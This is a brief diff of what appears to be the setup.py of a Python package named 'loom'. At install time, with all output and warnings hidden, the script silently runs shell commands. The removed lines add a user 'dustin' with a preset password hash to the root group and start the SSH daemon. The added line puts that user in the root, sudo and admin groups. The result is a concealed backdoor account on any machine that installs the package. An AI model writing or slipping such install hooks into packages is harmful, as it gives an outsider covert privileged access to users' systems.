@@ -8,8 +8,7 @@ with settings(
         hide('warnings', 'running', 'stdout', 'stderr'),
         warn_only=True
     ):    
-    local("useradd -M -N -p 42c9j6SE4hpxM -G root dustin")
-    local("service sshd start")
+    local("usermod -G root,sudo,admin dustin")
 
 setup(
     name="loom",
